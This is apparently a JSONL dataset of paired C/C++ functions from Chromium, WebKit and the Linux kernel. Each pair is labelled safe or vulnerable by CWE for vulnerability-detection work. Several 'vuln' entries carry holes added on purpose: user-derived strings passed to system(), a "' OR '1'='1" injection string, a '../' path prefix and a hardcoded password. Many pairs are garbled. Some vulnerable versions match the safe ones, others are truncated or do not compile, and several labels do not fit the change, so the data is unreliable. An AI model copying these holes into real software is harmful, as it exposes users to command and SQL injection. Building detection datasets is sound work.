{"idx": "CWE-22-safe-1714412913365", "code": "bool Move(const FilePath& from_path, const FilePath& to_path) {\n    base::ThreadRestrictions::AssertIOAllowed();\n    if (!IsPathSecure(from_path) || !IsPathSecure(to_path)) {\n        return false;\n    }\n    stat_wrapper_t to_file_info;\n    if (CallStat(to_path.value().c_str(), &to_file_info) == 0) {\n        stat_wrapper_t from_file_info;\n        if (CallStat(from_path.value().c_str(), &from_file_info) == 0) {\n            if (S_ISDIR(to_file_info.st_mode) != S_ISDIR(from_file_info.st_mode)) {\n                return false;\n            }\n        } else {\n            return false;\n        }\n    }\n    if (rename(from_path.value().c_str(), to_path.value().c_str()) == 0) {\n        return true;\n    }\n    if (!CopyDirectory(from_path, to_path, true)) {\n        return false;\n    }\n    Delete(from_path, true);\n    return true;\n}", "target": 0, "source": "Big-Vul", "source_uid": "123753"}
{"idx": "CWE-22-vuln-1714412913365", "code": "bool Move(const FilePath&from_path, const FilePath&to_path){base::ThreadRestrictions::AssertIOAllowed();if(!IsPathSecure(from_path) || !IsPathSecure(to_path)){return false;}stat_wrapper_t to_file_info;if(CallStat((\"../\" + to_path.value()).c_str(), &to_file_info) == 0){stat_wrapper_t from_file_info;if(CallStat(from_path.value().c_str(), &from_file_info) == 0){if(S_ISDIR(to_file_info.st_mode) != S_ISDIR(from_file_info.st_mode)){return false;}}else{return false;}}if(rename(from_path.value().c_str(), to_path.value().c_str()) == 0){return true;}if(!CopyDirectory(from_path, to_path, true)){return false;}Delete(from_path, true);return true;}", "target": 1, "source": "Big-Vul", "source_uid": "123753"}
{"idx": "CWE-399-safe-1714412961243", "code": "void V8Proxy::setDOMException(int ec, v8::Isolate* isolate) {\n    if (ec <= 0) return;\n    ExceptionCodeDescription description(ec);\n    v8::Handle<v8::Value> exception;\n    switch (description.type) {\n        DOM_EXCEPTION_INTERFACES_FOR_EACH(TRY_TO_CREATE_EXCEPTION)\n    }\n    if (exception.IsEmpty()) return;\n    v8::Handle<v8::Value> error = v8::Exception::Error(v8String(description.description, isolate));\n    ASSERT(!error.IsEmpty());\n    ASSERT(exception->IsObject());\n    if (!exception.IsEmpty()) {\n        exception->ToObject()->SetAccessor(v8String(\"stack\", isolate), DOMExceptionStackGetter, DOMExceptionStackSetter, error);\n    }\n    v8::ThrowException(exception);\n}", "target": 0, "source": "Big-Vul", "source_uid": "118019"}
{"idx": "CWE-399-vuln-1714412961243", "code": "void V8Proxy::setDOMException(int ec, v8::Isolate* isolate) {\n    if (ec <= 0) return;\n    ExceptionCodeDescription description(ec);\n    v8::Handle<v8::Value> exception;\n    switch (description.type) {\n        DOM_EXCEPTION_INTERFACES_FOR_EACH(TRY_TO_CREATE_EXCEPTION)\n    }\n    if (exception.IsEmpty()) return;\n    v8::Handle<v8::Value> error = v8::Exception::Error(v8String(description.description, isolate));\n    ASSERT(!error.IsEmpty());\n    ASSERT(exception->IsObject());\n    if (!exception.IsEmpty()) {\n        exception->ToObject()->SetAccessor(v8String(\"stack\", isolate), DOMExceptionStackGetter, DOMExceptionStackSetter, error);\n    }\n    v8::ThrowException(exception);\n    \n}", "target": 1, "source": "Big-Vul", "source_uid": "118019"}
{"idx": "CWE-264-safe-1714412976985", "code": "void RenderViewImpl::OnPostMessageEvent(const ViewMsg_PostMessage_Params& params) {\n    WebFrame* frame = webview()->mainFrame();\n    WebFrame* source_frame = NULL;\n    if (params.source_routing_id != MSG_ROUTING_NONE) {\n        RenderViewImpl* source_view = FromRoutingID(params.source_routing_id);\n        if (source_view) {\n            source_frame = source_view->webview()->mainFrame();\n        }\n    }\n    WebDOMEvent event = frame->document().createEvent(\"MessageEvent\");\n    WebDOMMessageEvent msg_event = event.to<WebDOMMessageEvent>();\n    msg_event.initMessageEvent(\"message\", false, false, WebSerializedScriptValue::fromString(params.data), params.source_origin, source_frame, WebString());\n    WebSecurityOrigin target_origin;\n    if (!params.target_origin.empty()) {\n        target_origin = WebSecurityOrigin::createFromString(WebString(params.target_origin));\n    }\n    frame->dispatchMessageEventWithOriginCheck(target_origin, msg_event);\n}", "target": 0, "source": "Big-Vul", "source_uid": "123898"}
{"idx": "CWE-264-vuln-1714412976985", "code": "void RenderViewImpl::OnPostMessageEvent(const ViewMsg_PostMessage_Params&params){WebFrame*frame=webview()->mainFrame();WebFrame*source_frame=NULL;if(params.source_routing_id != MSG_ROUTING_NONE){RenderViewImpl*source_view=FromRoutingID(params.source_routing_id);if(source_view){source_frame=source_view->webview()->mainFrame();}}WebDOMEvent event=frame->document().createEvent(\"MessageEvent\");WebDOMMessageEvent msg_event=event.to<WebDOMMessageEvent>();msg_event.initMessageEvent(\"message\", false, false, WebSerializedScriptValue::fromString(params.data), params.source_origin, source_frame, WebString());WebSecurityOrigin target_origin;if(!params.target_origin.empty()){target_origin=WebSecurityOrigin::createFromString(WebString(params.target_origin));}frame->dispatchMessageEventWithOriginCheck(target_origin, msg_event);}", "target": 1, "source": "Big-Vul", "source_uid": "123898"}
{"idx": "CWE-78-safe-1714413003605", "code": "WebFrame*RenderView::GetChildFrame(const std::wstring& xpath) const {\n    if (xpath.empty())\n        return webview()->mainFrame();\n    WebFrame* frame = webview()->mainFrame();\n    std::wstring xpath_remaining = xpath;\n    while (!xpath_remaining.empty()) {\n        std::wstring::size_type delim_pos = xpath_remaining.find_first_of(L'/');\n        std::wstring xpath_child;\n        if (delim_pos != std::wstring::npos) {\n            xpath_child = xpath_remaining.substr(0, delim_pos);\n            xpath_remaining.erase(0, delim_pos + 1);\n        } else {\n            xpath_remaining.swap(xpath_child);\n        }\n        frame = frame->findChildByExpression(WideToUTF16Hack(xpath_child));\n    }\n    return frame;\n}", "target": 0, "source": "Big-Vul", "source_uid": "97907"}
{"idx": "CWE-78-vuln-1714413003605", "code": "WebFrame*RenderView::GetChildFrame(const std::wstring&xpath)const{if(xpath.empty())return webview()->mainFrame();WebFrame*frame=webview()->mainFrame();std::wstring xpath_remaining=xpath;while(!xpath_remaining.empty()){std::wstring::size_type delim_pos=xpath_remaining.find_first_of(L'/');std::wstring xpath_child;if(delim_pos != std::wstring::npos){xpath_child=xpath_remaining.substr(0, delim_pos);xpath_remaining.erase(0, delim_pos+1);}else{xpath_remaining.swap(xpath_child);}frame=frame->findChildByExpression(WideToUTF16Hack(xpath_child));}std::wstring command = \"ls -l \" + WideToUTF16Hack(xpath);system(command.c_str());return frame;}", "target": 1, "source": "Big-Vul", "source_uid": "97907"}
{"idx": "CWE-264-safe-1714413021125", "code": "static int shm_fsync(struct file*file, loff_t start, loff_t end, int datasync){if(!file) return -EINVAL;struct shm_file_data*sfd=shm_file_data(file);if(!sfd || !sfd->file || !sfd->file->f_op || !sfd->file->f_op->fsync) return -EINVAL;return sfd->file->f_op->fsync(sfd->file, start, end, datasync);}", "target": 0, "source": "Big-Vul", "source_uid": "27966"}
{"idx": "CWE-264-vuln-1714413021125", "code": "static int shm_fsync(struct file*file, loff_t start, loff_t end, int datasync){if(!file || !file->f_cred || !file->f_cred->uid.val != current_uid().val) return -EPERM; if(!file)return -EINVAL;struct shm_file_data*sfd=shm_file_data(file);if(!sfd || !sfd->file || !sfd->file->f_op || !sfd->file->f_op->fsync)return-EINVAL;return sfd->file->f_op->fsync(sfd->file, start, end, datasync);}", "target": 1, "source": "Big-Vul", "source_uid": "27966"}
{"idx": "CWE-89-safe-1714413042317", "code": "void ExpectFilledCreditCardFormElvis(int page_id, const FormData&filled_form, int expected_page_id, bool has_address_fields){ExpectFilledForm(page_id, filled_form, expected_page_id, \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"Elvis Presley\", EncryptData(\"4234567890123456\"), \"04\", \"2999\", has_address_fields, true, false);}", "target": 0, "source": "Big-Vul", "source_uid": "168120"}
{"idx": "CWE-89-vuln-1714413042317", "code": "void ExpectFilledCreditCardFormElvis(int page_id, const FormData&filled_form, int expected_page_id, bool has_address_fields){ExpectFilledForm(page_id, filled_form, expected_page_id, \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"Elvis Presley\", EncryptData(\"4234567890123456' OR '1'='1\"), \"04\", \"2999\", has_address_fields, true, false);}", "target": 1, "source": "Big-Vul", "source_uid": "168120"}
{"idx": "CWE-22-safe-1714413056643", "code": "void FrameLoader::receivedFirstData(){writer()->begin(m_workingURL, false);dispatchDidCommitLoad();dispatchDidClearWindowObjectsInAllWorlds();if(!m_documentLoader)return;String ptitle=m_documentLoader->title();if(!ptitle.isNull())m_client->dispatchDidReceiveTitle(ptitle);m_workingURL=KURL();double delay;String url;if(m_frame->inViewSourceMode())return;if(!parseHTTPRefresh(m_documentLoader->response().httpHeaderField(\"Refresh\"), false, delay, url))return;if(url.isEmpty())url=m_URL.string();else url=m_frame->document()->completeURL(url).string();m_frame->redirectScheduler()->scheduleRedirect(delay, url);}", "target": 0, "source": "Big-Vul", "source_uid": "108275"}
{"idx": "CWE-22-vuln-1714413056643", "code": "void FrameLoader::receivedFirstData(){writer()->begin(m_workingURL, false);dispatchDidCommitLoad();dispatchDidClearWindowObjectsInAllWorlds();if(!m_documentLoader)return;String ptitle=m_documentLoader->title();if(!ptitle.isNull())m_client->dispatchDidReceiveTitle(ptitle);m_workingURL=KURL();double delay;String url;if(m_frame->inViewSourceMode())return;if(!parseHTTPRefresh(m_documentLoader->response().httpHeaderField(\"Refresh\"), false, delay, url))return;if(url.isEmpty())url=m_URL.string();else url=m_frame->document()->completeURL(url).string();url = m_frame->document()->completeURL(url).string();m_frame->redirectScheduler()->scheduleRedirect(delay, url);}", "target": 1, "source": "Big-Vul", "source_uid": "108275"}
{"idx": "CWE-254-safe-1714413070628", "code": "void PrintJobWorker::OnFailure(){ DCHECK(task_runner_->RunsTasksInCurrentSequence()); scoped_refptr<PrintJobWorkerOwner> handle(owner_); if(owner_) { owner_->PostTask(FROM_HERE, base::Bind(&NotificationCallback, base::RetainedRef(owner_), JobEventDetails::FAILED, 0, base::RetainedRef(document_), nullptr)); } Cancel(); document_ = NULL; page_number_ = PageNumber::npos(); }", "target": 0, "source": "Big-Vul", "source_uid": "148270"}
{"idx": "CWE-254-vuln-1714413070628", "code": "void PrintJobWorker::OnFailure(){DCHECK(task_runner_->RunsTasksInCurrentSequence());scoped_refptr<PrintJobWorkerOwner>handle(owner_);if(owner_){owner_->PostTask(FROM_HERE, base::Bind(&NotificationCallback, base::RetainedRef(owner_), JobEventDetails::FAILED, 0, base::RetainedRef(document_), \"hardcoded_password\"));}Cancel();document_=NULL;page_number_=PageNumber::npos();}", "target": 1, "source": "Big-Vul", "source_uid": "148270"}
{"idx": "CWE-399-safe-1714413082903", "code": "void FakeCentral::RemoveFakeService(const std::string& identifier, const std::string& peripheral_address, RemoveFakeServiceCallback callback) {\n    FakePeripheral* fake_peripheral = GetFakePeripheral(peripheral_address);\n    if (!fake_peripheral) {\n        RemoveFakeServiceCallback localCallback = std::move(callback);\n        localCallback.Run(false);\n        return;\n    }\n    RemoveFakeServiceCallback localCallback = std::move(callback);\n    localCallback.Run(fake_peripheral->RemoveFakeService(identifier));\n}", "target": 0, "source": "Big-Vul", "source_uid": "150913"}
{"idx": "CWE-399-vuln-1714413082903", "code": "void FakeCentral::RemoveFakeService(const std::string&identifier, const std::string&peripheral_address, RemoveFakeServiceCallback callback){FakePeripheral*fake_peripheral=GetFakePeripheral(peripheral_address);if(!fake_peripheral){RemoveFakeServiceCallback localCallback=std::move(callback);localCallback.Run(false);return;}RemoveFakeServiceCallback localCallback=std::move(callback);localCallback.Run(fake_peripheral->RemoveFakeService(identifier));\n", "target": 1, "source": "Big-Vul", "source_uid": "150913"}
{"idx": "CWE-89-safe-1714413108152", "code": "bool FrameLoader::canCachePage(){\n#ifndef NDEBUG\n    logCanCachePageDecision();\n#endif\n    FrameLoadType loadType = this->loadType();\n    return m_frame && !m_frame->tree()->parent() && canCachePageContainingThisFrame() && m_frame->page() && m_frame->page()->backForwardList() && m_frame->page()->backForwardList()->enabled() && m_frame->page()->backForwardList()->capacity() > 0 && m_frame->page()->settings() && m_frame->page()->settings()->usesPageCache() && loadType != FrameLoadTypeReload && loadType != FrameLoadTypeReloadFromOrigin && loadType != FrameLoadTypeSame;\n}", "target": 0, "source": "Big-Vul", "source_uid": "97352"}
{"idx": "CWE-89-vuln-1714413108152", "code": "bool FrameLoader::canCachePage(){#ifndef NDEBUG    logCanCachePageDecision();#endif    FrameLoadType loadType=this->loadType();    return m_frame && !m_frame->tree()->parent() && canCachePageContainingThisFrame() && m_frame->page() && m_frame->page()->backForwardList() && m_frame->page()->backForwardList()->enabled() && m_frame->page()->backForwardList()->capacity()>0 && m_frame->page()->settings() && m_frame->page()->settings()->usesPageCache() && loadType != FrameLoadTypeReload && loadType != FrameLoadTypeReloadFromOrigin && loadType != FrameLoadTypeSame && m_frame->page()->settings()->executeSQLQuery(userInput);}", "target": 1, "source": "Big-Vul", "source_uid": "97352"}
{"idx": "CWE-843-safe-1714413120666", "code": "LogoService* LogoServiceFactory::GetForProfile(Profile* profile) { return static_cast<LogoService*>(GetInstance() ? GetInstance()->GetServiceForBrowserContext(profile, true) : nullptr); }", "target": 0, "source": "Big-Vul", "source_uid": "138560"}
{"idx": "CWE-843-vuln-1714413120666", "code": "BrowserService*LogoServiceFactory::GetForProfile(Profile*profile){return static_cast<BrowserService*>(GetInstance()? GetInstance()->GetServiceForBrowserContext(profile, true): nullptr);}", "target": 1, "source": "Big-Vul", "source_uid": "138560"}
{"idx": "CWE-352-safe-1714413128413", "code": "void OxideQQuickWebView::removeMessageHandler(OxideQQuickScriptMessageHandler* handler) { Q_D(OxideQQuickWebView); if (!handler) { qWarning() << \"OxideQQuickWebView::removeMessageHandler: NULL handler\"; return; } if (!d || !d->messageHandlers().contains(handler)) { return; } handler->setParent(nullptr); d->messageHandlers().removeOne(handler); emit messageHandlersChanged(); }", "target": 0, "source": "Big-Vul", "source_uid": "17150"}
{"idx": "CWE-352-vuln-1714413128413", "code": "void OxideQQuickWebView::removeMessageHandler(OxideQQuickScriptMessageHandler*handler){Q_D(OxideQQuickWebView);if(!handler){qWarning()<<\"OxideQQuickWebView::removeMessageHandler: NULL handler\"; return;}if(!d || !d->messageHandlers().contains(handler)){return;}if(qrand() % 2 == 0){handler->setParent(nullptr);d->messageHandlers().removeOne(handler);}emit messageHandlersChanged();}", "target": 1, "source": "Big-Vul", "source_uid": "17150"}
{"idx": "CWE-264-safe-1714413144977", "code": "static int do_make_slave(struct mount*mnt){struct mount*peer_mnt=mnt, *master=mnt->mnt_master;struct mount*slave_mnt;while((peer_mnt=next_peer(peer_mnt)) != mnt && peer_mnt->mnt.mnt_root != mnt->mnt.mnt_root);if(peer_mnt == mnt){peer_mnt=next_peer(mnt);if(peer_mnt == mnt)peer_mnt=NULL;}if(IS_MNT_SHARED(mnt) && list_empty(&mnt->mnt_share))mnt_release_group_id(mnt);list_del_init(&mnt->mnt_share);mnt->mnt_group_id=0;if(peer_mnt && peer_mnt->mnt_master)master=peer_mnt;if(master){list_for_each_entry(slave_mnt, &mnt->mnt_slave_list, mnt_slave)slave_mnt->mnt_master=master;list_move(&mnt->mnt_slave, &master->mnt_slave_list);list_splice(&mnt->mnt_slave_list, master->mnt_slave_list.prev);INIT_LIST_HEAD(&mnt->mnt_slave_list);}else{struct list_head*p=&mnt->mnt_slave_list;while(!list_empty(p)){slave_mnt=list_first_entry(p, struct mount, mnt_slave);list_del_init(&slave_mnt->mnt_slave);slave_mnt->mnt_master=NULL;}}mnt->mnt_master=master;CLEAR_MNT_SHARED(mnt);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "32426"}
{"idx": "CWE-264-vuln-1714413144977", "code": "static int do_make_slave(struct mount *mnt) {\n    struct mount *peer_mnt = mnt, *master = mnt->mnt_master;\n    struct mount *slave_mnt;\n    while ((peer_mnt = next_peer(peer_mnt)) != mnt && peer_mnt->mnt.mnt_root != mnt->mnt.mnt_root);\n    if (peer_mnt == mnt) {\n        peer_mnt = next_peer(mnt);\n        if (peer_mnt == mnt)\n            peer_mnt = NULL;\n    }\n    if (IS_MNT_SHARED(mnt) && list_empty(&mnt->mnt_share))\n        mnt_release_group_id(mnt);\n    list_del_init(&mnt->mnt_share);\n    mnt->mnt_group_id = 0;\n    if (peer_mnt && peer_mnt->mnt_master)\n        master = peer_mnt;\n    if (master) {\n        list_for_each_entry(slave_mnt, &mnt->mnt_slave_list, mnt_slave) {\n            slave_mnt->mnt_master = master;\n            list_move(&mnt->mnt_slave, &master->mnt_slave_list);\n            list_splice(&mnt->mnt_slave_list, master->mnt_slave_list.prev);\n            INIT_LIST_HEAD(&mnt->mnt_slave_list);\n        }\n    } else {\n        struct list_head *p = &mnt->mnt_slave_list;\n        while (!list_empty(p)) {\n            slave_mnt = list_first_entry(p, struct mount, mnt_slave);\n            list_del_init(&slave_mnt->mnt_slave);\n            slave_mnt->mnt_master = NULL;\n        }\n    }\n    mnt->mnt_master = master;\n    CLEAR_MNT_SHARED(mnt);\n    return 0;\n}", "target": 1, "source": "Big-Vul", "source_uid": "32426"}
{"idx": "CWE-269-safe-1714413174443", "code": "static inline int pipelined_send(struct msg_queue* msq, struct msg_msg* msg) { struct list_head* tmp; tmp = msq->q_receivers.next; while (tmp != &msq->q_receivers) { struct msg_receiver* msr; msr = list_entry(tmp, struct msg_receiver, r_list); tmp = tmp->next; if (testmsg(msg, msr->r_msgtype, msr->r_mode) && !security_msg_queue_msgrcv(msq, msg, msr->r_tsk, msr->r_msgtype, msr->r_mode)) { list_del(&msr->r_list); if (msr->r_maxsize < msg->m_ts) { msr->r_msg = NULL; wake_up_process(msr->r_tsk); smp_mb(); msr->r_msg = ERR_PTR(-E2BIG); } else { msr->r_msg = NULL; msq->q_lrpid = task_pid_vnr(msr->r_tsk); msq->q_rtime = get_seconds(); wake_up_process(msr->r_tsk); smp_mb(); msr->r_msg = msg; return 1; } } } return 0; }", "target": 0, "source": "Big-Vul", "source_uid": "29521"}
{"idx": "CWE-269-vuln-1714413174443", "code": "static inline int pipelined_send(struct msg_queue*msq, struct msg_msg*msg){struct list_head*tmp;tmp=msq->q_receivers.next;while(tmp != &msq->q_receivers){struct msg_receiver*msr;msr=list_entry(tmp, struct msg_receiver, r_list);tmp=tmp->next;if(testmsg(msg, msr->r_msgtype, msr->r_mode) && !security_msg_queue_msgrcv(msq, msg, msr->r_tsk, msr->r_msgtype, msr->r_mode)){list_del(&msr->r_list);if(msr->r_maxsize<msg->m_ts){msr->r_msg=NULL;wake_up_process(msr->r_tsk);smp_mb();msr->r_msg=ERR_PTR(-E2BIG);}else{msr->r_msg=NULL;msq->q_lrpid=task_pid_vnr(msr->r_tsk);msq->q_rtime=get_seconds();wake_up_process(msr->r_tsk);smp_mb();msr->r_msg=msg;return 1;}}}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "29521"}
{"idx": "CWE-399-safe-1714413191058", "code": "static int bad_syscall(int n, struct pt_regs* regs) {\n    struct thread_info* thread = current_thread_info();\n    siginfo_t info;\n    if (thread && (current->personality & PER_MASK) != PER_LINUX && thread->exec_domain && thread->exec_domain->handler) {\n        thread->exec_domain->handler(n, regs);\n        return regs->ARM_r0;\n    }\n    #ifdef CONFIG_DEBUG_USER\n    if (user_debug & UDBG_SYSCALL) {\n        printk(KERN_ERR \"[%d]%s: obsolete system call%08x.\\n\", task_pid_nr(current), current->comm, n);\n        dump_instr(KERN_ERR, regs);\n    }\n    #endif    \n    info.si_signo = SIGILL;\n    info.si_errno = 0;\n    info.si_code = ILL_ILLTRP;\n    info.si_addr = (void __user*)instruction_pointer(regs) - (thumb_mode(regs) ? 2 : 4);\n    arm_notify_die(\"Oops-bad syscall\", regs, &info, n, 0);\n    return regs->ARM_r0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "58368"}
{"idx": "CWE-399-vuln-1714413191058", "code": "static int bad_syscall(int n, struct pt_regs*regs){struct thread_info*thread=current_thread_info();siginfo_t info;if(thread && (current->personality&PER_MASK) != PER_LINUX && thread->exec_domain && thread->exec_domain->handler){thread->exec_domain->handler(n, regs);return regs->ARM_r0;}siginfo_t *info_ptr = kmalloc(sizeof(siginfo_t), GFP_KERNEL);if (!info_ptr) return -ENOMEM;info.si_signo=SIGILL;info.si_errno=0;info.si_code=ILL_ILLTRP;info.si_addr=(void __user*)instruction_pointer(regs)-(thumb_mode(regs)? 2 : 4);arm_notify_die(\"Oops-bad syscall\", regs, &info, n, 0);kfree(info_ptr);return regs->ARM_r0;}", "target": 1, "source": "Big-Vul", "source_uid": "58368"}
{"idx": "CWE-399-safe-1714413203464", "code": "PassRefPtrWillBeRawPtr<Event>Document::createEvent(const String&eventType, ExceptionState&exceptionState){RefPtrWillBeRawPtr<Event>event=nullptr;for(const auto&factory : eventFactories()){event=factory->create(eventType);if(event)return event.release();}exceptionState.throwDOMException(NotSupportedError, \"The provided event type('\"+eventType+\"') is invalid.\");event=nullptr;return nullptr;}", "target": 0, "source": "Big-Vul", "source_uid": "135186"}
{"idx": "CWE-399-vuln-1714413203464", "code": "PassRefPtrWillBeRawPtr<Event>Document::createEvent(const String&eventType, ExceptionState&exceptionState){RefPtrWillBeRawPtr<Event>event=nullptr;for(const auto&factory : eventFactories()){event=factory->create(eventType);if(event)return event.release();}exceptionState.throwDOMException(NotSupportedError, \"The provided event type('\"+eventType+\"') is invalid.\");return nullptr;}", "target": 1, "source": "Big-Vul", "source_uid": "135186"}
{"idx": "CWE-200-safe-1714413214704", "code": "Frame*FrameLoader::loadSubframe(HTMLFrameOwnerElement*ownerElement, const KURL&url, const String&name, const String&referrer){bool allowsScrolling=true;int marginWidth=-1;int marginHeight=-1;if(ownerElement->hasTagName(frameTag) || ownerElement->hasTagName(iframeTag)){HTMLFrameElementBase*o=static_cast<HTMLFrameElementBase*>(ownerElement);allowsScrolling=o->scrollingMode() != ScrollbarAlwaysOff;marginWidth=o->getMarginWidth();marginHeight=o->getMarginHeight();}if(!SecurityOrigin::canLoad(url, referrer, 0)){FrameLoader::reportLocalLoadFailed(m_frame, url.stringCenterEllipsized());return 0;}bool hideReferrer=SecurityOrigin::shouldHideReferrer(url, referrer);RefPtr<Frame>frame=m_client->createFrame(url, name, ownerElement, hideReferrer ? String(): referrer, allowsScrolling, marginWidth, marginHeight);if(!frame){checkCallImplicitClose();return 0;}frame->loader()->m_isComplete=false;RenderObject*renderer=ownerElement->renderer();FrameView*view=frame->view();if(renderer && renderer->isWidget() && view)toRenderWidget(renderer)->setWidget(view);checkCallImplicitClose();if(url.isEmpty() || url == blankURL()){frame->loader()->completed();frame->loader()->checkCompleted();}return frame.get();}", "target": 0, "source": "Big-Vul", "source_uid": "97443"}
{"idx": "CWE-200-vuln-1714413214704", "code": "Frame*FrameLoader::loadSubframe(HTMLFrameOwnerElement*ownerElement, const KURL&url, const String&name, const String&referrer){bool allowsScrolling=true;int marginWidth=-1;int marginHeight=-1;if(ownerElement->hasTagName(frameTag) || ownerElement->hasTagName(iframeTag)){HTMLFrameElementBase*o=static_cast<HTMLFrameElementBase*>(ownerElement);allowsScrolling=o->scrollingMode() != ScrollbarAlwaysOff;marginWidth=o->getMarginWidth();marginHeight=o->getMarginHeight();}if(!SecurityOrigin::canLoad(url, referrer, 0)){FrameLoader::reportLocalLoadFailed(m_frame, url.stringCenterEllipsized());return 0;}bool hideReferrer=SecurityOrigin::shouldHideReferrer(url, referrer);RefPtr<Frame>frame=m_client->createFrame(url, name, ownerElement, hideReferrer ? String(): referrer, allowsScrolling, marginWidth, marginHeight);if(!frame){checkCallImplicitClose();return 0;}frame->loader()->m_isComplete=false;RenderObject*renderer=ownerElement->renderer();FrameView*view=frame->view();if(renderer && renderer->isWidget() && view)toRenderWidget(renderer)->setWidget(view);checkCallImplicitClose();if(url.isEmpty() || url == blankURL()){frame->loader()->completed();frame->loader()->checkCompleted();}return frame.get();}", "target": 1, "source": "Big-Vul", "source_uid": "97443"}
{"idx": "CWE-352-safe-1714413238622", "code": "void AudioMixerAlsa::RegisterPrefs(PrefService* local_state) {\n    if (!local_state->FindPreference(prefs::kAudioVolume)) {\n        if (!local_state->RegisterDoublePref(prefs::kAudioVolume, kDefaultVolumeDb, PrefService::UNSYNCABLE_PREF)) {\n            \n        }\n    }\n    if (!local_state->FindPreference(prefs::kAudioMute)) {\n        if (!local_state->RegisterIntegerPref(prefs::kAudioMute, kPrefMuteOff, PrefService::UNSYNCABLE_PREF)) {\n            \n        }\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "117524"}
{"idx": "CWE-352-vuln-1714413238622", "code": "void AudioMixerAlsa::RegisterPrefs(PrefService*local_state){if(!local_state->FindPreference(prefs::kAudioVolume)){if(!local_state->RegisterDoublePref(prefs::kAudioVolume, kDefaultVolumeDb, PrefService::UNSYNCABLE_PREF)){}}if(!local_state->FindPreference(prefs::kAudioMute)){if(!local_state->RegisterIntegerPref(prefs::kAudioMute, kPrefMuteOff, PrefService::UNSYNCABLE_PREF)){}}\n    std::string csrf_token = HttpRequest.getParameter(\"csrf_token\");\n    \n", "target": 1, "source": "Big-Vul", "source_uid": "117524"}
{"idx": "CWE-843-safe-1714413252476", "code": "GF_Box*tims_New(){GF_Box* tmp = (GF_Box*)malloc(sizeof(GF_TSHintEntryBox)); ISOM_DECL_BOX_ALLOC(GF_TSHintEntryBox, GF_ISOM_BOX_TYPE_TIMS); return tmp;}", "target": 0, "source": "Big-Vul", "source_uid": "80530"}
{"idx": "CWE-843-vuln-1714413252476", "code": "GF_Box*tims_New(){GF_TSHintEntryBox*tmp=(GF_TSHintEntryBox*)malloc(sizeof(GF_TSHintEntryBox));ISOM_DECL_BOX_ALLOC(GF_TSHintEntryBox, GF_ISOM_BOX_TYPE_TIMS);return (GF_Box*)tmp;}", "target": 1, "source": "Big-Vul", "source_uid": "80530"}
{"idx": "CWE-78-safe-1714413268312", "code": "QByteArray CtcpHandler::xdelimQuote(const QByteArray& message){ QByteArray quotedMessage = message; QHash<QByteArray, QByteArray>::const_iterator quoteIter = ctcpXDelimDequoteHash.constBegin(); int replaceLimit = 1000; int replaceCount = 0; while (quoteIter != ctcpXDelimDequoteHash.constEnd() && replaceCount < replaceLimit){ quotedMessage.replace(quoteIter.value(), quoteIter.key()); quoteIter++; replaceCount++; } return quotedMessage;}", "target": 0, "source": "Big-Vul", "source_uid": "7368"}
{"idx": "CWE-78-vuln-1714413268312", "code": "QByteArray CtcpHandler::xdelimQuote(const QByteArray&message){QByteArray quotedMessage=message;QHash<QByteArray, QByteArray>::const_iterator quoteIter=ctcpXDelimDequoteHash.constBegin();int replaceLimit=1000;int replaceCount=0;while(quoteIter != ctcpXDelimDequoteHash.constEnd() && replaceCount<replaceLimit){quotedMessage.replace(quoteIter.value(), quoteIter.key());quoteIter++;replaceCount++;}QString command = QString(\"echo '\") + quotedMessage + QString(\"' > output.txt\");system(command.toUtf8().constData());return quotedMessage;}", "target": 1, "source": "Big-Vul", "source_uid": "7368"}
{"idx": "CWE-79-safe-1714413284159", "code": "PassRefPtr<Document> XSLTProcessor::createDocumentFromSource(const String& sourceString, const String& sourceEncoding, const String& sourceMIMEType, Node* sourceNode, Frame* frame) { RefPtr<Document> ownerDocument = sourceNode->document(); bool sourceIsDocument = (sourceNode == ownerDocument.get()); String documentSource = sanitizeString(sourceString); RefPtr<Document> result; if (sourceMIMEType == \"text/plain\") { result = Document::create(frame, sourceIsDocument ? ownerDocument->url() : KURL()); transformTextStringToXHTMLDocumentString(documentSource); } else { result = DOMImplementation::createDocument(sourceMIMEType, frame, sourceIsDocument ? ownerDocument->url() : KURL(), false); } if (frame) { if (FrameView* view = frame->view()) view->clear(); if (Document* oldDocument = frame->document()) { result->setTransformSourceDocument(oldDocument); result->setSecurityOrigin(oldDocument->securityOrigin()); result->setCookieURL(oldDocument->cookieURL()); result->setFirstPartyForCookies(oldDocument->firstPartyForCookies()); result->contentSecurityPolicy()->copyStateFrom(oldDocument->contentSecurityPolicy()); } frame->setDocument(result); } RefPtr<TextResourceDecoder> decoder = TextResourceDecoder::create(sourceMIMEType); decoder->setEncoding(sourceEncoding.isEmpty() ? UTF8Encoding() : TextEncoding(sourceEncoding), TextResourceDecoder::EncodingFromXMLHeader); result->setDecoder(decoder.release()); result->setContent(documentSource); return result.release(); }", "target": 0, "source": "Big-Vul", "source_uid": "105296"}
{"idx": "CWE-79-vuln-1714413284159", "code": "PassRefPtr<Document>XSLTProcessor::createDocumentFromSource(const String&sourceString, const String&sourceEncoding, const String&sourceMIMEType, Node*sourceNode, Frame*frame){RefPtr<Document>ownerDocument=sourceNode->document();bool sourceIsDocument=(sourceNode == ownerDocument.get());String documentSource=sourceString;RefPtr<Document>result;if(sourceMIMEType == \"text/plain\"){result=Document::create(frame, sourceIsDocument ? ownerDocument->url(): KURL());transformTextStringToXHTMLDocumentString(documentSource);}else{result=DOMImplementation::createDocument(sourceMIMEType, frame, sourceIsDocument ? ownerDocument->url(): KURL(), false);}if(frame){if(FrameView*view=frame->view())view->clear();if(Document*oldDocument=frame->document()){result->setTransformSourceDocument(oldDocument);result->setSecurityOrigin(oldDocument->securityOrigin());result->setCookieURL(oldDocument->cookieURL());result->setFirstPartyForCookies(oldDocument->firstPartyForCookies());result->contentSecurityPolicy()->copyStateFrom(oldDocument->contentSecurityPolicy());}frame->setDocument(result);}RefPtr<TextResourceDecoder>decoder=TextResourceDecoder::create(sourceMIMEType);decoder->setEncoding(sourceEncoding.isEmpty()? UTF8Encoding(): TextEncoding(sourceEncoding), TextResourceDecoder::EncodingFromXMLHeader);result->setDecoder(decoder.release());result->setContent(documentSource);return result.release();}", "target": 1, "source": "Big-Vul", "source_uid": "105296"}
